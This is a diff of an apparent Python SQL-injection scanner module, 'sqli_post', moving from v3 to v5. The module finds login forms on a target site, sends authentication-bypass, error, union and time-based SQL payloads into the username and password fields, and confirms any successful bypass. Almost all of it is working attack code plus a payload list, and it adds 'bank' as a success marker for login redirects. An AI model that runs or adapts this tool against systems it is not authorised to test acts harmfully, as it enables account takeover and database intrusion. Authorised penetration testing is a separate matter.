@@ -1,46 +1,28 @@
-"""sqli_post v3 — auto-discover login forms + SQLi in POST fields"""
+"""sqli_post v5 — sniper: 40 curated payloads + auto-discover login forms"""
 import re
+import time
 from urllib.parse import urljoin, urlparse
 from core.http import HttpClient
+from core.sniper_payloads import SNIPER_SQLI
 
 
-# Признаки форм логина (по имени полей)
-USER_FIELDS = ["uid", "username", "user", "email", "login", "uname", "account"]
-PASS_FIELDS = ["passw", "password", "pass", "pwd", "passwd", "secret"]
-
-# Признаки успеха (в заголовках и HTML)
+# Признаки успеха логина
 SUCCESS_MARKERS = [
     "logout", "sign out", "sign-out", "log out", "dashboard", "my account",
     "welcome", "administrator", "admin panel", "profile",
 ]
 
-# Все профильные payload'ы (error + boolean + time + union)
-PROBES = [
-    ("error",     "'",                              "error"),
-    ("error",     '"',                              "error"),
-    ("error",     "')",                             "error"),
-    ("bypass",    "' OR '1'='1",                    "bypass"),
-    ("bypass",    "admin'--",                       "bypass"),
-    ("bypass",    "admin'#",                        "bypass"),
-    ("bypass",    "' OR 1=1--",                     "bypass"),
-    ("bypass",    "' OR 'x'='x",                    "bypass"),
-    ("bypass",    "') OR ('1'='1",                  "bypass"),
-    ("boolean",   "' AND '1'='1",                   "boolean"),
-    ("boolean",   "' AND '1'='2",                   "boolean"),
-    ("time",      "' AND SLEEP(3)-- -",             "time"),
-    ("time",      "'; SELECT pg_sleep(3)-- -",      "time"),
-    ("time",      "'; WAITFOR DELAY '0:0:3'-- -",   "time"),
-    ("union",     "' UNION SELECT NULL-- -",        "union"),
-    ("union",     "' UNION SELECT NULL,NULL-- -",   "union"),
-    ("union",     "' UNION SELECT 1,2,3-- -",       "union"),
-    ("stacked",   "'; SELECT 1-- -",                "stacked"),
-    ("extract",   "' AND extractvalue(1,concat(0x7e,version()))-- -", "extract"),
-]
+# Поля логина
+USER_FIELDS = ["uid", "username", "user", "email", "login", "uname", "account"]
+PASS_FIELDS = ["passw", "password", "pass", "pwd", "passwd", "secret"]
 
+# Error markers (расширенный)
 ERROR_MARKERS = [
     "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlstate",
     "unclosed quotation", "quoted string", "syntax error",
     "jdbc", "java.sql", "odbc", "microsoft ole db",
+    "xpath syntax", "double value out of range", "extractvalue",
+    "updatexml", "utl_inaddr", "invalid input syntax",
 ]
 
 
@@ -48,138 +30,187 @@ class SqliPost:
     def run(self, session, logger):
         target = session.target
         base_url = target.split("?")[0] if "?" in target else target
+        http = HttpClient(session, logger)
 
-        # если задан --extra post=uid=x&passw=y — использовать как есть
-        forced_post = None
-        forced_action = None
-        for x in session.extra:
-            if x.startswith("post="):
-                forced_post = x[5:]
-            elif x.startswith("action="):
-                forced_action = x.split("=", 1)[1]
+        print(f"[sqli_post v5] sniper mode")
+        print(f"[sqli_post v5] target: {base_url}")
 
-        print(f"[sqli_post] target: {base_url}")
-
-        # === Discover login forms ===
-        forms = self._discover_forms(base_url, session, logger)
-        if forced_action:
-            forms.append({"action": forced_action, "fields": ["uid", "passw"]})
-
+        # 1. discover forms
+        forms = self._discover_forms(http, base_url)
         if not forms:
-            print("[sqli_post] No login forms found")
-            print("  hint: указать --extra action=/login --extra post=user=x&pass=y")
+            print("[sqli_post v5] no login forms found")
             return {"findings": []}
 
-        print(f"[sqli_post] found {len(forms)} forms")
+        print(f"[sqli_post v5] found {len(forms)} forms:")
         for f in forms:
-            print(f"  {f['action']} — fields: {f['fields']}")
+            print(f"  {f['action']} fields={f['user_field']}/{f['pass_field']}")
+        print()
 
-        # === Test each form ===
         findings = []
+
         for form in forms:
             action = form["action"]
             user_field = form["user_field"]
             pass_field = form["pass_field"]
-
-            print(f"\n[sqli_post] testing form: {action}")
-            print(f"  user_field={user_field} pass_field={pass_field}")
-
             url = urljoin(base_url, action)
-            http = HttpClient(session, logger)
 
-            # baseline — неверные данные
+            print(f"[form] {url}")
+            print(f"  fields: {user_field} / {pass_field}")
+
+            # baseline
             base_data = {user_field: "x_test_user", pass_field: "x_test_pass"}
             base = http.post(url, data=base_data)
             if not base:
+                print(f"  x no response")
                 continue
-            base_has_success = self._has_success(base)
 
-            # test all probes on each field
+            base_success = self._has_success(base)
+            base_len = len(base.content)
+            base_time = self._baseline_time_post(http, url, base_data, samples=2)
+            print(f"  baseline: {base.status_code} {base_len}b avg={base_time:.2f}s success={base_success}")
+
+            # Test each field with all sniper probes
             for field in [user_field, pass_field]:
+                print(f"  [field: {field}]")
                 field_found = False
-                for pname, payload, ptype in PROBES:
-                    if field_found:
+
+                # Группируем probes по типу для последовательного теста
+                by_type = {
+                    "error": [p for p in SNIPER_SQLI if p["type"] == "error"],
+                    "bypass": [],  # bypass отдельно
+                    "union": [p for p in SNIPER_SQLI if p["type"] == "union"],
+                    "time": [p for p in SNIPER_SQLI if p["type"] == "time"],
+                    "boolean": [p for p in SNIPER_SQLI if p["type"] == "boolean"],
+                }
+
+                # Bypass-проверка: специальные payload'ы
+                BYPASS = [
+                    ("bypass_or_1_1", "' OR '1'='1"),
+                    ("bypass_admin_comment", "admin'--"),
+                    ("bypass_or_num", "' OR 1=1--"),
+                ]
+                for bp_name, bp in BYPASS:
+                    if base_success:
+                        continue
+                    data = {user_field: "admin", pass_field: "x"}
+                    data[field] = bp
+                    r = http.post(url, data=data, allow_redirects=True)
+                    if r and self._has_success(r):
+                        print(f"    ✓ [{bp_name}] BYPASS")
+                        findings.append({"field": field, "name": bp_name,
+                                         "payload": bp, "type": "auth_bypass"})
+                        logger.finding("sqli_post_bypass", "critical",
+                                       f"{field}={bp[:30]}")
+                        field_found = True
                         break
+
+                if field_found:
+                    continue
+
+                # Error + union + time probes
+                for probe in by_type["error"] + by_type["union"]:
+                    pname = probe["name"]
+                    payload = probe["payload"]
+                    ptype = probe["type"]
 
                     data = {user_field: "admin", pass_field: "x"}
                     data[field] = payload
-                    t0 = __import__("time").time()
+
+                    t0 = time.time()
                     r = http.post(url, data=data, allow_redirects=True)
-                    dt = __import__("time").time() - t0
+                    dt = time.time() - t0
                     if not r:
                         continue
 
                     low = r.text.lower()
 
-                    # 1. error
-                    if ptype in ("error", "extract"):
-                        err = next((m for m in ERROR_MARKERS if m in low), None)
-                        if err:
-                            print(f"    ✓ SQL ERROR [{pname}] {field}: {payload[:30]} → {err}")
-                            findings.append({"field": field, "payload": payload,
-                                             "type": "error", "marker": err})
-                            logger.finding("sqli_post_error", "high",
-                                           f"{field}={payload[:40]} ({err})")
-                            field_found = True
-                            continue
+                    # error
+                    if ptype == "error":
+                        for m in ERROR_MARKERS:
+                            if m in low:
+                                print(f"    ✓ [{pname}] ERROR → {m[:40]}")
+                                findings.append({
+                                    "field": field, "name": pname,
+                                    "payload": payload, "type": "error",
+                                    "marker": m, "dbms": probe["dbms"],
+                                })
+                                logger.finding("sqli_post_error", "high",
+                                               f"{field} {pname}: {m[:40]}")
+                                field_found = True
+                                break
 
-                    # 2. time
-                    if ptype == "time" and dt > 2.5:
-                        print(f"    ✓ TIME [{pname}] {field}: delay={dt:.2f}s")
-                        findings.append({"field": field, "payload": payload,
-                                         "type": "time", "delay": round(dt, 2)})
-                        logger.finding("sqli_post_time", "high",
-                                       f"{field}={payload[:40]} delay={dt:.2f}s")
-                        field_found = True
-                        continue
-
-                    # 3. union
-                    if ptype == "union":
-                        if len(r.content) != len(base.content) and abs(len(r.content) - len(base.content)) > 50:
-                            print(f"    ✓ UNION [{pname}] {field}: diff={len(r.content)-len(base.content):+d}b")
-                            findings.append({"field": field, "payload": payload,
-                                             "type": "union"})
+                    # union
+                    elif ptype == "union":
+                        diff = len(r.content) - base_len
+                        if abs(diff) > 50:
+                            print(f"    ✓ [{pname}] UNION diff={diff:+d}b")
+                            findings.append({
+                                "field": field, "name": pname,
+                                "payload": payload, "type": "union",
+                                "diff": diff, "dbms": probe["dbms"],
+                            })
                             logger.finding("sqli_post_union", "high",
-                                           f"{field}={payload[:40]}")
+                                           f"{field} {pname} diff={diff}")
                             field_found = True
-                            continue
+                            break
 
-                    # 4. bypass
-                    if ptype == "bypass" and not base_has_success and self._has_success(r):
-                        print(f"    ✓ BYPASS [{pname}] {field}: {payload[:30]}")
-                        findings.append({"field": field, "payload": payload,
-                                         "type": "auth_bypass"})
-                        logger.finding("sqli_post_bypass", "critical",
-                                       f"{field}={payload[:40]}")
-                        field_found = True
-                        continue
-
-                    # 5. boolean — сравнение произойдёт после цикла
-
-            # verification: 2nd attempt with mutated payload if bypass found
-            if any(f["type"] == "auth_bypass" for f in findings):
-                print(f"  [verify] повторная проверка bypass")
-                for payload in ["' OR '1'='1", "' OR 1=1--"]:
-                    data = {user_field: "admin", pass_field: payload}
-                    r = http.post(url, data=data)
-                    if r and self._has_success(r):
-                        logger.finding("sqli_post_verified", "critical",
-                                       f"bypass verified on {action}")
-                        print(f"    ✓ VERIFIED: {payload[:30]}")
+                    if field_found:
                         break
 
-        print(f"\n[sqli_post] total: {len(findings)} findings")
+                if field_found:
+                    continue
+
+                # Time probes (медленные — только если ничего не нашли)
+                for probe in by_type["time"]:
+                    pname = probe["name"]
+                    payload = probe["payload"]
+
+                    data = {user_field: "admin", pass_field: "x"}
+                    data[field] = payload
+
+                    t0 = time.time()
+                    r = http.post(url, data=data, allow_redirects=True)
+                    dt = time.time() - t0
+
+                    if dt > base_time + 2.5:
+                        print(f"    ✓ [{pname}] TIME delay={dt:.2f}s")
+                        findings.append({
+                            "field": field, "name": pname,
+                            "payload": payload, "type": "time",
+                            "delay": round(dt, 2), "dbms": probe["dbms"],
+                        })
+                        logger.finding("sqli_post_time", "high",
+                                       f"{field} {pname} delay={dt:.2f}s")
+                        field_found = True
+                        break
+
+            # verify if any bypass/error found
+            if findings:
+                print(f"  [verify] повторная проверка")
+                first = findings[0]
+                data = {user_field: "admin", pass_field: "x"}
+                data[first["field"]] = first["payload"]
+                r = http.post(url, data=data, allow_redirects=True)
+                if r:
+                    low = r.text.lower()
+                    verified = (
+                        (first["type"] == "auth_bypass" and self._has_success(r)) or
+                        (first["type"] == "error" and any(m in low for m in ERROR_MARKERS))
+                    )
+                    if verified:
+                        print(f"    ✓ VERIFIED")
+                        first["verified"] = True
+                        logger.finding("sqli_post_verified", "critical",
+                                       f"verified on {action}")
+
+        print()
+        print(f"[sqli_post v5] findings: {len(findings)}")
         return {"findings": findings}
 
-    def _discover_forms(self, base_url, session, logger):
-        """Найти формы логина на странице + общих путях."""
-        from core.http import HttpClient
-        http = HttpClient(session, logger)
-        forms = []
-
-        # 1. главная + типовые пути
+    def _discover_forms(self, http, base_url):
         paths = ["", "/login", "/login.jsp", "/signin", "/admin", "/admin/login",
-                 "/user/login", "/auth/login"]
+                 "/user/login", "/auth/login", "/doLogin"]
+        forms = []
 
         for path in paths:
             url = base_url.rstrip("/") + path if path else base_url
@@ -187,68 +218,49 @@ class SqliPost:
             if not r or r.status_code != 200:
                 continue
 
-            # парсим все формы
             for m in re.finditer(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.S):
                 form_html = m.group(0)
-                action = self._extract_action(form_html, url)
+                action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
+                action = action_m.group(1) if action_m else url
                 fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
-                fields = [f for f in fields if f.lower() not in ("submit", "btnsubmit", "btn")]
+                fields = [f for f in fields if f.lower() not in ("submit", "btnsubmit", "btn", "button")]
 
-                user_field, pass_field = self._identify_fields(fields)
-                if user_field and pass_field:
-                    if action not in [f["action"] for f in forms]:
-                        forms.append({
-                            "action": action,
-                            "fields": fields,
-                            "user_field": user_field,
-                            "pass_field": pass_field,
-                        })
+                uf = pf = None
+                for f in fields:
+                    low = f.lower()
+                    if any(k in low for k in PASS_FIELDS): pf = f
+                    elif any(k in low for k in USER_FIELDS): uf = f
+                if uf and pf:
+                    action_key = (action, uf, pf)
+                    if action_key not in [(f["action"], f["user_field"], f["pass_field"]) for f in forms]:
+                        forms.append({"action": action, "user_field": uf, "pass_field": pf,
+                                      "fields": fields})
 
         return forms
 
-    def _extract_action(self, form_html, page_url):
-        m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
-        action = m.group(1) if m else ""
-        if not action:
-            return page_url
-        return action
-
-    def _identify_fields(self, fields):
-        """Определить user_field и pass_field."""
-        uf = pf = None
-        low_fields = [f.lower() for f in fields]
-        for orig, low in zip(fields, low_fields):
-            if any(k in low for k in ["pass", "pwd", "secret"]):
-                pf = orig
-            elif any(k in low for k in ["user", "uid", "email", "login", "uname", "account"]):
-                uf = orig
-        # fallback: первое = user, второе = pass
-        if not uf and fields:
-            uf = fields[0]
-        if not pf and len(fields) > 1:
-            pf = fields[1]
-        return uf, pf
+    def _baseline_time_post(self, http, url, data, samples=2):
+        times = []
+        for _ in range(samples):
+            t0 = time.time()
+            http.post(url, data=data)
+            times.append(time.time() - t0)
+            time.sleep(0.15)
+        return sum(times) / len(times) if times else 0.5
 
     def _has_success(self, response):
-        """Проверить признаки успешного логина."""
         loc = response.headers.get("Location", "")
-        set_cookie = response.headers.get("Set-Cookie", "")
-        text = response.text.lower()[:3000]
-
-        # redirect на main/dashboard, а не login
-        if loc and any(k in loc.lower() for k in ["main", "dashboard", "account", "profile"]):
+        if loc and any(k in loc.lower() for k in ["main", "dashboard", "account", "profile", "bank"]):
             return True
         if loc and "login" in loc.lower():
             return False
 
-        # session cookie после логина
-        if "set-cookie" in str(response.headers).lower():
-            if any(k in set_cookie.lower() for k in ["session", "auth", "token", "sid"]):
-                # не считать, если в body есть форма логина
-                if "type=\"password\"" not in text:
-                    return True
+        set_cookie = response.headers.get("Set-Cookie", "")
+        if set_cookie and any(k in set_cookie.lower() for k in ["session", "auth", "token", "sid"]):
+            text = response.text.lower()[:2000]
+            if "type=\"password\"" not in text:
+                return True
 
-        # HTML-маркеры
+        text = response.text.lower()[:3000]
         for m in SUCCESS_MARKERS:
             if m in text and "type=\"password\"" not in text:
                 return True
